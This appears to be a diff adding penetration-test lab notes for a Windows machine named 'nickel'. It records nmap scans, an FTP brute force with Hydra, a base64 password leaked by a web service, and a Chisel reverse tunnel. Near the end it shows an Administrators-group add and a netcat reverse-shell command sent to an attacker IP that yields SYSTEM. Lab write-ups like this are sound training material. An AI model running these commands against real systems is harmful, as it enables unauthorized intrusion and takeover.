@@ -1,0 +1,143 @@
+### Enumeration
+```
+IP=192.168.247.99
+sudo nmap -sU $IP
+sudo nmap -p- -vv $IP
+sudo nmap -p21,22,80,135,139,445,3389,5040,7680,8089,33333,49665,49666,49667,49668,49669 -A $IP
+```
+### Ports 
+- 21
+	- FileZilla Server 0.9.60 beta
+- 22
+	- OpenSSH for_Windows_8.1 (protocol 2.0)
+- 80
+	- Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+- 135
+	- RPC
+- 139
+	- Microsoft Windows netbios-ssn
+- 445
+	- microsoft-ds
+- 3389
+	- ms-wbt-server Microsoft Terminal Services
+- 5040
+	- unknown
+- 7680
+	- pando-pub
+- 8089
+	- Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+- 33333
+	- Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+- 49665
+	- RPC
+- 49666
+	- RPC
+- 49667
+	- RPC
+- 49668
+	- RPC
+- 49669
+	- RPC
+### Foothold
+- 21
+	- ftp anonymous@$IP
+		- login failed
+	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
+		- no password found
+- RPC/ SMB
+	- enum4linux -U $IP
+		- nothing
+- 445
+	- smbclient -N -L //$IP
+		- access denied
+	- nmap --script smb-vuln* -p135,139,445 $IP
+		- not vulnerable
+- 80
+	- Default landing page
+		- ![[Pasted image 20240712085358.png]]
+	- Versions
+	- Directory Brute force
+		- dirsearch -u http://$IP
+			- can't connect
+		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
+		- Found directories
+- 8089
+	- Default landing page
+		- ![[Pasted image 20240712090335.png]]
+	- Versions
+	- All buttons lead to http://169.254.129.94:33333/list-current-deployments?
+	- Directory Brute force
+		- dirsearch -u http://$IP
+			- nothing
+		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
+		- Found directories
+- 33333
+	- Default landing page
+		- ![[Pasted image 20240712090344.png]]
+	- Tried using list-current-deployments  -  not found
+		- Used burp and changed to POST
+		- ![[Pasted image 20240712092052.png]]
+		- Found this line
+			- `cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
+			- crackstation did not find it
+			- echo '' | base64 -d
+				- NowiseSloopTheory139
+				- Able to ssh into machine
+	- Directory Brute force
+		- dirsearch -u http://$IP
+			- nothing
+		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
+### PE
+#### Windows
+- ariah
+	- whoami /all
+		- SeShutdownPrivilege enabled
+		- SeChangeNotifyPrivilege enabled
+		- SeUndockPrivilege enabled
+		- SeIncreaseWorkingSetPrivilege enabled
+		- SeTimeZonePrivilege enabled
+	- net user USERNAME
+		- nothing
+	- systeminfo
+		- access denied
+	- history
+		- (Get-PSReadLineOption).HistorySavePath
+			- type PATH
+		- nothing
+	- Users with console
+		- Administrator
+		- guest
+		- ariah
+		- defaultaccount
+	- Unquoted
+		- cmd
+			- wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+		- PS1
+			- Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+				- access denied
+		- icacls Filepath before .exe
+			- Looking for W or F
+	- can login to ftp
+		- infrastructure.pdf
+			- requires password
+			- ![[Pasted image 20240712094932.png]]
+			- ariah4168
+			- ![[Pasted image 20240712094959.png]]
+			- Can send command by `Invoke-WebRequest 'http://nickel/?whoami' -UseBasicParsing`
+	- Chisel setup
+		- On A:sudo ./chisel server --reverse -v -p 1234
+		- On B: chisel64.exe client -v A_IP:1234 R:socks
+		- On A: Proxychains confg - socks5 	127.0.0.1 1080
+	- Commands
+		- ![[Pasted image 20240712134726.png]]
+		- Command: net%20localgroup%20Administrators%20ariah%20%2Fadd
+			- Adds our user to admin group
+			- Then we can rdp in and run cmd as admin
+		- Other
+			- Move nc.exe to target
+			- On A: nc -lvnp 443
+			- `proxychains curl 'http://127.0.0.1:80?C%3A%5Ctemp%5Cnc.exe%20192.168.45.195%20443%20-e%20cmd'`
+			- Gives us `nt authority\system
+### Credentials
+- ariah:NowiseSloopTheory139
+### Lessons Learned
